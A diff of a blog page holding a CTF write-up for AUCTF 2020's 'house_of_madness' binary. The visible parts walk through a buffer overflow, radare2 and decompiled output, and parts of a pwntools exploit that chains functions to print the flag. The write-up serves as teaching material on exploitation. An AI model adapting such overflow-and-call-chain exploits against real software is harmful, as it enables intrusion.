@@ -68,9 +68,7 @@
 
 
 <script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
- <meta name="generator" content="Hugo 0.129.0">
-        
-
+ <meta name="generator" content="Hugo 0.161.1">
         
 
         
@@ -113,15 +111,11 @@
                     
                         <ul class="nav navbar-nav navbar-right">
                             
-                                <li class="navbar-icon"><a href="https://github.com/raffaeleflorio/"><i class="fab fa-github"></i></a></li>
-                            
                                 <li class="navbar-icon"><a href="https://www.linkedin.com/in/raffaeleflorio"><i class="fab fa-linkedin"></i></a></li>
-                            
-                                <li class="navbar-icon"><a href="https://twitter.com/raffaeleflorio_"><i class="fab fa-twitter"></i></a></li>
                             
                                 <li class="navbar-icon"><a href="https://hackernoon.com/u/raffaeleflorio"><i class="fas fa-user-astronaut"></i></a></li>
                             
-                                <li class="navbar-icon"><a href="/key.asc"><i class="fas fa-key"></i></a></li>
+                                <li class="navbar-icon"><a href="https://github.com/raffaeleflorio/"><i class="fab fa-github"></i></a></li>
                             
                                 <li class="navbar-icon"><a href="mailto:raffaeleflorio@protonmail.com"><i class="fas fa-envelope"></i></a></li>
                             
@@ -160,12 +154,12 @@
 <p>Note: ASLR is disabled for this challenge</p>
 </blockquote>
 <p>You could download the binary <a href="/ctf/auctf2020/binary/house_of_madness">here</a>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sha256sum ./house_of_madness
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sha256sum ./house_of_madness
 </span></span><span style="display:flex;"><span>15b1a68ae0e1d4eee4f917cc92412d90fd3a4adbb5a55a83b115e0f438baaf93  house_of_madness
 </span></span></code></pre></div><h1 id="exploitation">Exploitation</h1>
 <p>When we launch the program shows a banner and it asks us to make a choice. I tried at this point, without success, a classic buffer overflow.</p>
 <p>However if we try to exit the program shows us the direction. Indeed there is a buffer overflow:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./house_of_madness
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./house_of_madness
 </span></span><span style="display:flex;"><span>+------------------------+
 </span></span><span style="display:flex;"><span>|          Welcome       |
 </span></span><span style="display:flex;"><span>|            to          |
@@ -205,7 +199,7 @@
 </span></span><span style="display:flex;"><span>Enter something: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 </span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
 </span></span></code></pre></div><p>So I analyzed the program with checksec and I opened it with radare2:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ checksec house_of_madness
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ checksec house_of_madness
 </span></span><span style="display:flex;"><span>    Arch:     i386-32-little
 </span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
 </span></span><span style="display:flex;"><span>    Stack:    No canary found
@@ -213,16 +207,16 @@
 </span></span><span style="display:flex;"><span>    PIE:      PIE enabled
 </span></span><span style="display:flex;"><span>$ r2 -Ad ./house_of_madness
 </span></span></code></pre></div><p>Then I found these interesting functions:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; afl
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; afl
 </span></span><span style="display:flex;"><span>.....
 </span></span><span style="display:flex;"><span>0x56556580    <span style="color:#ae81ff">8</span> <span style="color:#ae81ff">261</span>          sym.room4
 </span></span><span style="display:flex;"><span>0x5655686b   <span style="color:#ae81ff">16</span> <span style="color:#ae81ff">360</span>          sym.get_flag
 </span></span><span style="display:flex;"><span>.....
 </span></span></code></pre></div><p>The <code>room4</code> function use <code>gets</code> if <code>Stephen</code> was given as first input. However if we try to call directly <code>get_flag</code>, exploiting the buffer overflow, we got:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./exploit.py
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./exploit.py
 </span></span><span style="display:flex;"><span>It<span style="color:#960050;background-color:#1e0010">&#39;</span>s not going to be that easy. Come on
 </span></span></code></pre></div><p>So I decompiled the <code>get_flag</code> function and it prints the flag iff four keys have the correct values:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">get_flag</span>(<span style="color:#66d9ef">void</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">get_flag</span>(<span style="color:#66d9ef">void</span>)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
@@ -272,7 +266,7 @@
 <p>It’s a bit more complex than <code>get_key1</code>. Indeed it writes 1 in <code>key2</code>, but it should be called before <code>get_key1</code> and after that <code>key3</code> points to “Dormammu”.</p>
 <p>Given these prerequisites we can use it.</p>
 <p>Here the function:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">get_key2</span>(<span style="color:#66d9ef">void</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">get_key2</span>(<span style="color:#66d9ef">void</span>)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
 </span></span><span style="display:flex;"><span>
@@ -286,7 +280,7 @@
 </span></span></code></pre></div><h3 id="set_key4">set_key4</h3>
 <p>It checks all other keys, then it writes the correct values in <code>key4</code>.</p>
 <p>As <code>get_key2</code> if <code>key3</code> points to “Dormammu” we can use it:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set_key4</span>(<span style="color:#66d9ef">void</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set_key4</span>(<span style="color:#66d9ef">void</span>)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
 </span></span><span style="display:flex;"><span>  
@@ -303,7 +297,7 @@
 <p>We need a way to write the correct pointer in <code>key3</code>.
 It’s the last piece of the puzzle. After some digging I found this function.
 I analyzed its behavior and it writes in <code>key3</code> a pointer to “Dormammu”:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; afl
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; afl
 </span></span><span style="display:flex;"><span>.....
 </span></span><span style="display:flex;"><span>0x565567cd    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">28</span>           sym.AAsDrwEk
 </span></span><span style="display:flex;"><span>.....
@@ -325,7 +319,7 @@ I analyzed its behavior and it writes in <code>key3</code> a pointer to “Dorma
 </span></span></code></pre></div><h3 id="exploit">Exploit</h3>
 <p>So we have all the pieces in place.</p>
 <p>This is my exploit:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 </span></span><span style="display:flex;"><span>
@@ -368,7 +362,7 @@ I analyzed its behavior and it writes in <code>key3</code> a pointer to “Dorma
 </span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>interactive()
 </span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>close()
 </span></span></code></pre></div><p>And this is the flag:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./exploit.py
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./exploit.py
 </span></span><span style="display:flex;"><span>.....
 </span></span><span style="display:flex;"><span>Damn you beat the house: auctf<span style="color:#f92672">{</span>gu3ss_th3_h0us3_1sn<span style="color:#960050;background-color:#1e0010">&#39;</span>t_th4t_m4d<span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>.....
@@ -457,9 +451,6 @@ I analyzed its behavior and it writes in <code>key3</code> a pointer to “Dorma
 
 </div>
  
-    
-
-    
     
 
 </main>
